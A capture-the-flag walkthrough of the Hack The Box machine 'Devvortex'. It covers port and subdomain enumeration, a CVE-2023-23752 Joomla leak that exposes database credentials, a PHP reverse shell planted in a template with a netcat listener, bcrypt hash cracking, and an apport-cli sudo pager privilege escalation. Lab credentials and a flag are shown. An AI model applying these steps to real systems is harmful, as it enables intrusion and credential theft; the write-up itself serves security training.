# Devvortex

## Reconnaissance

### Nmap

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV 10.129.54.161
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-25 19:01 UTC
Nmap scan report for 10.129.54.161
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
No OS matches for host
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   103.40 ms 10.10.14.1
2   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.66 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV -p- 10.129.54.161
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-25 19:04 UTC
Nmap scan report for devvortex.htb (10.129.54.161)
Host is up (0.10s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DevVortex
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=11/25%OT=22%CT=1%CU=32933%PV=Y%DS=2%DC=T%G=Y%TM=656
OS:24787%P=x86_64-pc-linux-gnu)SEQ(SP=F3%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=F4%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST
OS:11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=F
OS:E88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M
OS:53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T
OS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%
OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   103.56 ms 10.10.14.1
2   103.75 ms devvortex.htb (10.129.54.161)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 579.36 seconds
```

### Enumeration of Port 80/TCP

> http://10.129.54.161

```c
┌──(user㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.54.161   devvortex.htb
10.129.54.161   dev.devvortex.htb
```

> http://devvortex.htb

```c
┌──(user㉿kali)-[~]
└─$ whatweb http://devvortex.htb
http://devvortex.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@DevVortex.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.54.161], JQuery[3.4.1], Script[text/javascript], Title[DevVortex], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

#### Directory Busting with dirsearch

```c
┌──(user㉿kali)-[~]
└─$ dirsearch -u http://devvortex.htb/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/user/reports/http_devvortex.htb/__23-11-25_19-02-53.txt

Target: http://devvortex.htb/

[19:02:53] Starting: 
[19:02:57] 301 -  178B  - /js  ->  http://devvortex.htb/js/                 
[19:03:06] 200 -    7KB - /about.html                                       
[19:03:23] 200 -    9KB - /contact.html                                     
[19:03:24] 301 -  178B  - /css  ->  http://devvortex.htb/css/               
[19:03:33] 403 -  564B  - /images/                                          
[19:03:33] 301 -  178B  - /images  ->  http://devvortex.htb/images/         
[19:03:35] 403 -  564B  - /js/                                              
                                                                             
Task Completed
```

#### Subdomain Enumeration with ffuf

```c
┌──(user㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.devvortex.htb" -u http://devvortex.htb --fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 197ms]
:: Progress: [114441/114441] :: Job [1/1] :: 384 req/sec :: Duration: [0:06:56] :: Errors: 0 ::
```

### Enumeration of dev.devvortex.htb

> http://dev.devvortex.htb

```c
┌──(user㉿kali)-[~]
└─$ whatweb http://dev.devvortex.htb
http://dev.devvortex.htb [200 OK] Bootstrap, Cookies[1daf6e3366587cf9ab315f8ef3b5ed78], Country[RESERVED][ZZ], Email[contact@devvortex.htb,contact@example.com,info@Devvortex.htb,info@devvortex.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[1daf6e3366587cf9ab315f8ef3b5ed78], IP[10.129.54.161], Lightbox, Script, Title[Devvortex], UncommonHeaders[referrer-policy,cross-origin-opener-policy], X-Frame-Options[SAMEORIGIN], nginx[1.18.0]
```

#### More Directory Busting with dirsearch

```c
┌──(user㉿kali)-[~]
└─$ dirsearch -u http://dev.devvortex.htb/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/user/reports/http_dev.devvortex.htb/__23-11-25_19-04-55.txt

Target: http://dev.devvortex.htb/

[19:04:55] Starting:                                                                                                                                                                                                                        
[19:04:57] 403 -  564B  - /%2e%2e;/test                                     
[19:04:57] 404 -   16B  - /php                                              
[19:05:20] 404 -   16B  - /adminphp                                         
[19:05:22] 403 -  564B  - /admin/.config                                    
[19:05:47] 301 -  178B  - /administrator  ->  http://dev.devvortex.htb/administrator/
[19:05:48] 403 -  564B  - /administrator/includes/                          
[19:05:48] 200 -   31B  - /administrator/cache/
[19:05:48] 301 -  178B  - /administrator/logs  ->  http://dev.devvortex.htb/administrator/logs/
[19:05:48] 200 -   31B  - /administrator/logs/
[19:05:48] 200 -   12KB - /administrator/                                   
[19:05:48] 200 -   12KB - /administrator/index.php                          
[19:05:54] 403 -  564B  - /admpar/.ftppass                                  
[19:05:54] 403 -  564B  - /admrev/.ftppass
[19:05:56] 301 -  178B  - /api  ->  http://dev.devvortex.htb/api/           
[19:05:57] 404 -   54B  - /api/api-docs                                     
[19:05:57] 404 -   54B  - /api/application.wadl
[19:05:57] 404 -   54B  - /api/
[19:05:57] 404 -   54B  - /api/cask/graphql
[19:05:57] 404 -   54B  - /api/apidocs/swagger.json
[19:05:57] 404 -   54B  - /api/batch
[19:05:57] 404 -   54B  - /api/2/explore/
[19:05:57] 404 -   54B  - /api/docs
[19:05:57] 404 -   54B  - /api/2/issue/createmeta
[19:05:57] 404 -   54B  - /api/__swagger__/
[19:05:57] 404 -   54B  - /api/_swagger_/
[19:05:57] 404 -   54B  - /api/api
[19:05:57] 404 -   54B  - /api/apidocs
[19:05:57] 404 -   54B  - /api/docs/
[19:05:57] 404 -   54B  - /api/config
[19:05:57] 404 -   54B  - /api/error_log
[19:05:57] 404 -   54B  - /api/index.html
[19:05:57] 404 -   54B  - /api/login.json
[19:05:57] 404 -   54B  - /api/jsonws
[19:05:57] 404 -   54B  - /api/package_search/v4/documentation
[19:05:57] 404 -   54B  - /api/proxy
[19:05:57] 404 -   54B  - /api/jsonws/invoke
[19:05:57] 404 -   54B  - /api/profile
[19:05:57] 404 -   54B  - /api/snapshots
[19:05:57] 404 -   54B  - /api/spec/swagger.json
[19:05:57] 404 -   54B  - /api/swagger-ui.html
[19:05:57] 404 -   54B  - /api/swagger
[19:05:57] 404 -   54B  - /api/swagger.yml
[19:05:57] 404 -   54B  - /api/swagger.json
[19:05:57] 404 -   54B  - /api/swagger.yaml
[19:05:57] 404 -   54B  - /api/swagger/index.html
[19:05:57] 404 -   54B  - /api/swagger/swagger
[19:05:57] 404 -   54B  - /api/swagger/static/index.html
[19:05:57] 404 -   54B  - /api/v1
[19:05:57] 404 -   54B  - /api/swagger/ui/index
[19:05:58] 404 -   54B  - /api/v1/swagger.json
[19:05:58] 404 -   54B  - /api/timelion/run
[19:05:58] 404 -   54B  - /api/v1/
[19:05:58] 404 -   54B  - /api/v1/swagger.yaml
[19:05:58] 404 -   54B  - /api/v2
[19:05:58] 404 -   54B  - /api/v3
[19:05:58] 404 -   54B  - /api/v4
[19:05:58] 404 -   54B  - /api/vendor/phpunit/phpunit/phpunit
[19:05:58] 404 -   54B  - /api/v2/
[19:05:58] 404 -   54B  - /api/v2/swagger.json
[19:05:58] 404 -   54B  - /api/v2/helpdesk/discover
[19:05:58] 404 -   54B  - /api/v2/swagger.yaml                              
[19:05:58] 404 -   54B  - /api/version                                      
[19:05:58] 404 -   54B  - /api/whoami
[19:06:09] 403 -  564B  - /bitrix/.settings                                 
[19:06:09] 403 -  564B  - /bitrix/.settings.bak                             
[19:06:10] 403 -  564B  - /bitrix/.settings.php.bak
[19:06:13] 301 -  178B  - /cache  ->  http://dev.devvortex.htb/cache/       
[19:06:14] 200 -   31B  - /cache/                                           
[19:06:14] 403 -    4KB - /cache/sql_error_latest.cgi                       
[19:06:20] 200 -   31B  - /cli/                                             
[19:06:23] 301 -  178B  - /components  ->  http://dev.devvortex.htb/components/
[19:06:23] 200 -   31B  - /components/                                      
[19:06:26] 200 -    0B  - /configuration.php                                
[19:06:49] 403 -  564B  - /ext/.deps                                        
[19:07:03] 200 -    7KB - /htaccess.txt                                     
[19:07:06] 301 -  178B  - /images  ->  http://dev.devvortex.htb/images/     
[19:07:06] 200 -   31B  - /images/                                          
[19:07:07] 403 -    4KB - /images/c99.php                                   
[19:07:07] 403 -    4KB - /images/Sym.php                                   
[19:07:08] 301 -  178B  - /includes  ->  http://dev.devvortex.htb/includes/ 
[19:07:08] 200 -   31B  - /includes/
[19:07:18] 301 -  178B  - /language  ->  http://dev.devvortex.htb/language/ 
[19:07:18] 200 -   31B  - /layouts/                                         
[19:07:19] 403 -  564B  - /lib/flex/uploader/.actionScriptProperties        
[19:07:19] 403 -  564B  - /lib/flex/uploader/.flexProperties                
[19:07:19] 403 -  564B  - /lib/flex/uploader/.project                       
[19:07:19] 403 -  564B  - /lib/flex/uploader/.settings                      
[19:07:19] 403 -  564B  - /lib/flex/varien/.actionScriptProperties          
[19:07:19] 403 -  564B  - /lib/flex/varien/.project                         
[19:07:19] 403 -  564B  - /lib/flex/varien/.flexLibProperties               
[19:07:19] 403 -  564B  - /lib/flex/varien/.settings                        
[19:07:19] 301 -  178B  - /libraries  ->  http://dev.devvortex.htb/libraries/
[19:07:19] 200 -   31B  - /libraries/
[19:07:20] 200 -   18KB - /LICENSE.txt                                      
[19:07:26] 403 -  564B  - /mailer/.env                                      
[19:07:30] 200 -   31B  - /media/                                           
[19:07:30] 301 -  178B  - /media  ->  http://dev.devvortex.htb/media/
[19:07:35] 301 -  178B  - /modules  ->  http://dev.devvortex.htb/modules/   
[19:07:36] 200 -   31B  - /modules/                                         
[19:07:38] 404 -   16B  - /myadminphp                                       
[19:08:00] 301 -  178B  - /plugins  ->  http://dev.devvortex.htb/plugins/   
[19:08:00] 200 -   31B  - /plugins/
[19:08:09] 200 -    5KB - /README.txt                                       
[19:08:11] 403 -  564B  - /resources/.arch-internal-preview.css             
[19:08:11] 403 -  564B  - /resources/sass/.sass-cache/                      
[19:08:13] 200 -  764B  - /robots.txt                                       
[19:08:17] 404 -    4KB - /secure/ConfigurePortalPages!default.jspa?view=popular
[19:08:39] 200 -   31B  - /templates/index.html                             
[19:08:39] 301 -  178B  - /templates  ->  http://dev.devvortex.htb/templates/
[19:08:39] 200 -   31B  - /templates/
[19:08:39] 200 -    0B  - /templates/system/                                
[19:08:41] 301 -  178B  - /tmp  ->  http://dev.devvortex.htb/tmp/           
[19:08:41] 200 -   31B  - /tmp/
[19:08:42] 403 -    4KB - /tmp/2.php                                        
[19:08:42] 403 -    4KB - /tmp/admin.php                                    
[19:08:42] 403 -    4KB - /tmp/Cgishell.pl                                  
[19:08:42] 403 -    4KB - /tmp/d.php
[19:08:42] 403 -    4KB - /tmp/cgi.pl
[19:08:42] 403 -    4KB - /tmp/cpn.php
[19:08:42] 403 -    4KB - /tmp/dz.php
[19:08:42] 403 -    4KB - /tmp/changeall.php                                
[19:08:42] 403 -    4KB - /tmp/domaine.pl
[19:08:42] 403 -    4KB - /tmp/d0maine.php
[19:08:42] 403 -    4KB - /tmp/domaine.php
[19:08:42] 403 -    4KB - /tmp/priv8.php
[19:08:42] 403 -    4KB - /tmp/dz1.php
[19:08:42] 403 -    4KB - /tmp/upload.php
[19:08:42] 403 -    4KB - /tmp/up.php                                       
[19:08:42] 403 -    4KB - /tmp/index.php                                    
[19:08:42] 403 -    4KB - /tmp/root.php
[19:08:42] 403 -    4KB - /tmp/sql.php
[19:08:42] 403 -    4KB - /tmp/Sym.php                                      
[19:08:43] 403 -    4KB - /tmp/madspotshell.php                             
[19:08:43] 403 -    4KB - /tmp/killer.php                                   
[19:08:43] 403 -    4KB - /tmp/L3b.php
[19:08:43] 403 -    4KB - /tmp/vaga.php
[19:08:43] 403 -    4KB - /tmp/whmcs.php
[19:08:43] 403 -    4KB - /tmp/uploads.php
[19:08:43] 403 -    4KB - /tmp/user.php
[19:08:43] 403 -    4KB - /tmp/xd.php
[19:08:44] 403 -  564B  - /twitter/.env                                     
[19:08:58] 200 -    3KB - /web.config.txt                                   
                                                                             
Task Completed
```

> http://dev.devvortex.htb/administrator/

> http://dev.devvortex.htb/api/

```c
┌──(user㉿kali)-[~]
└─$ curl http://dev.devvortex.htb/robots.txt
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

## Foothold via CVE-2023-23752

> http://dev.devvortex.htb/administrator/manifests/files/joomla.xml

> https://github.com/ThatNotEasy/CVE-2023-23752

```c
┌──(user㉿kali)-[/media/…/machines/devvortex/files/CVE-2023-23752]
└─$ python3 joomla.py
```

```c
██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ 
██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗
██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║
██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║
██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║
██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ 
═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════
╔════════════╩═════════════════════════════════╩═════════════════════════════╗
║ • AUTHOR                 |   PARI MALAM                                    ║
║ • GITHUB                 |   GITHUB.COM/PARI-MALAM                         ║
╔════════════════════════════════════════════════════════════════════════════╝
║ • OFFICIAL FORUM         |   DRAGONFORCE.IO                                ║
║ • OFFICIAL TELEGRAM      |   @DRAGONFORCE.IO                               ║
╚════════════════════════════════════════════════════════════════════════════╝
[CVE-2023-23752] - Authentication Bypass Information Leak on Joomla!

[1] - Single Scan
[2] - Massive Scan

[CVE-2023-23752]: 1

IP/Domain: dev.devvortex.htb

[CVE-2023-23752] - dev.devvortex.htb .: [Scanning!]

[+] Domain            : dev.devvortex.htb
[+] Database Type     : mysqli
[+] Database Prefix   : sd4fg_
[+] Database          : joomla
[+] Hostname          : localhost
[+] Username          : lewis
[+] Password          : P4ntherg0t1n5r3c0n##
```

| Username | Password |
| --- | --- |
| lewis | P4ntherg0t1n5r3c0n## |

> http://dev.devvortex.htb/administrator/index.php

> https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla

We edited the `error.php` with our reverse shell payload.

> http://dev.devvortex.htb/administrator/index.php?option=com_templates&view=template&id=223&file=L2Vycm9yLnBocA%3D%3D&isMedia=0

> https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php

Trigger:

> http://dev.devvortex.htb/templates/cassiopeia/error.php

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.54.161] 35692
SOCKET: Shell has connected! PID: 1148
```

## Stabilizing Shell

```c
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ ^Z
zsh: suspended  nc -lnvp 9001
                                                                                                                                                                                                                                            
┌──(user㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 9001

www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ 
<vvortex.htb/templates/cassiopeia$ export XTERM=xterm                       
www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$
```

## Enumeration

```c
www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```c
www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 9116
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

```c
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)
```

```c
mysql> show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
| sd4fg_banner_clients          |
| sd4fg_banner_tracks           |
| sd4fg_banners                 |
| sd4fg_categories              |
| sd4fg_contact_details         |
| sd4fg_content                 |
| sd4fg_content_frontpage       |
| sd4fg_content_rating          |
| sd4fg_content_types           |
| sd4fg_contentitem_tag_map     |
| sd4fg_extensions              |
| sd4fg_fields                  |
| sd4fg_fields_categories       |
| sd4fg_fields_groups           |
| sd4fg_fields_values           |
| sd4fg_finder_filters          |
| sd4fg_finder_links            |
| sd4fg_finder_links_terms      |
| sd4fg_finder_logging          |
| sd4fg_finder_taxonomy         |
| sd4fg_finder_taxonomy_map     |
| sd4fg_finder_terms            |
| sd4fg_finder_terms_common     |
| sd4fg_finder_tokens           |
| sd4fg_finder_tokens_aggregate |
| sd4fg_finder_types            |
| sd4fg_history                 |
| sd4fg_languages               |
| sd4fg_mail_templates          |
| sd4fg_menu                    |
| sd4fg_menu_types              |
| sd4fg_messages                |
| sd4fg_messages_cfg            |
| sd4fg_modules                 |
| sd4fg_modules_menu            |
| sd4fg_newsfeeds               |
| sd4fg_overrider               |
| sd4fg_postinstall_messages    |
| sd4fg_privacy_consents        |
| sd4fg_privacy_requests        |
| sd4fg_redirect_links          |
| sd4fg_scheduler_tasks         |
| sd4fg_schemas                 |
| sd4fg_session                 |
| sd4fg_tags                    |
| sd4fg_template_overrides      |
| sd4fg_template_styles         |
| sd4fg_ucm_base                |
| sd4fg_ucm_content             |
| sd4fg_update_sites            |
| sd4fg_update_sites_extensions |
| sd4fg_updates                 |
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
71 rows in set (0.00 sec)
```

```c
mysql> select * from sd4fg_users \G;
*************************** 1. row ***************************
           id: 649
         name: lewis
     username: lewis
        email: lewis@devvortex.htb
     password: $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
        block: 0
    sendEmail: 1
 registerDate: 2023-09-25 16:44:24
lastvisitDate: 2023-11-25 19:18:27
   activation: 0
       params: 
lastResetTime: NULL
   resetCount: 0
       otpKey: 
         otep: 
 requireReset: 0
 authProvider: 
*************************** 2. row ***************************
           id: 650
         name: logan paul
     username: logan
        email: logan@devvortex.htb
     password: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
        block: 0
    sendEmail: 0
 registerDate: 2023-09-26 19:15:42
lastvisitDate: NULL
   activation: 
       params: {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"}
```

## Cracking the Hash with John

```c
┌──(user㉿kali)-[/media/…/htb/machines/devvortex/files]
└─$ cat hash
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/devvortex/files]
└─$ sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)     
1g 0:00:00:10 DONE (2023-11-25 19:27) 0.09285g/s 130.3p/s 130.3c/s 130.3C/s lacoste..harry
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

| Username | Password |
| --- | --- |
| logan | tequieromucho |

```c
┌──(user㉿kali)-[~]
└─$ ssh logan@devvortex.htb
The authenticity of host 'devvortex.htb (10.129.54.161)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:169: [hashed name]
    ~/.ssh/known_hosts:188: [hashed name]
    ~/.ssh/known_hosts:258: [hashed name]
    ~/.ssh/known_hosts:300: [hashed name]
    ~/.ssh/known_hosts:301: [hashed name]
    ~/.ssh/known_hosts:302: [hashed name]
    ~/.ssh/known_hosts:316: [hashed name]
    ~/.ssh/known_hosts:344: [hashed name]
    (6 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'devvortex.htb' (ED25519) to the list of known hosts.
logan@devvortex.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 25 Nov 2023 07:27:56 PM UTC

  System load:           1.07
  Usage of /:            62.0% of 4.76GB
  Memory usage:          16%
  Swap usage:            0%
  Processes:             167
  Users logged in:       0
  IPv4 address for eth0: 10.129.54.161
  IPv6 address for eth0: dead:beef::250:56ff:feb0:c5be

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Tue Nov 21 10:53:48 2023 from 10.10.14.23
```

## user.txt

```c
logan@devvortex:~$ cat user.txt 
a47b64b88ec68d40f39bf08791e45901
```

## Pivoting

```c
logan@devvortex:~$ id
uid=1000(logan) gid=1000(logan) groups=1000(logan)
```

```c
logan@devvortex:~$ sudo -l
[sudo] password for logan:
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

```c
logan@devvortex:~$ sudo /usr/bin/apport-cli --version
2.20.11
```

```c
logan@devvortex:~$ sudo /usr/bin/apport-cli --help
Usage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]

Options:
  -h, --help            show this help message and exit
  -f, --file-bug        Start in bug filing mode. Requires --package and an
                        optional --pid, or just a --pid. If neither is given,
                        display a list of known symptoms. (Implied if a single
                        argument is given.)
  -w, --window          Click a window as a target for filing a problem
                        report.
  -u UPDATE_REPORT, --update-bug=UPDATE_REPORT
                        Start in bug updating mode. Can take an optional
                        --package.
  -s SYMPTOM, --symptom=SYMPTOM
                        File a bug report about a symptom. (Implied if symptom
                        name is given as only argument.)
  -p PACKAGE, --package=PACKAGE
                        Specify package name in --file-bug mode. This is
                        optional if a --pid is specified. (Implied if package
                        name is given as only argument.)
  -P PID, --pid=PID     Specify a running program in --file-bug mode. If this
                        is specified, the bug report will contain more
                        information.  (Implied if pid is given as only
                        argument.)
  --hanging             The provided pid is a hanging application.
  -c PATH, --crash-file=PATH
                        Report the crash from given .apport or .crash file
                        instead of the pending ones in /var/crash. (Implied if
                        file is given as only argument.)
  --save=PATH           In bug filing mode, save the collected information
                        into a file instead of reporting it. This file can
                        then be reported later on from a different machine.
  --tag=TAG             Add an extra tag to the report. Can be specified
                        multiple times.
  -v, --version         Print the Apport version number.
```

## Privilege Escalation to root

> https://github.com/advisories/GHSA-qgrc-7333-5cgx

> https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb

```c
The apport-cli supports view a crash. These features invoke the default
pager, which is likely to be less, other functions may apply.

It can be used to break out from restricted environments by spawning an
interactive system shell. If the binary is allowed to run as superuser
by sudo, it does not drop the elevated privileges and may be used to
access the file system, escalate or maintain privileged access.

apport-cli should normally not be called with sudo or pkexec. In case it
is called via sudo or pkexec execute `sensible-pager` as the original
user to avoid privilege elevation.

Proof of concept:

$ sudo apport-cli -c /var/crash/xxx.crash
[...]
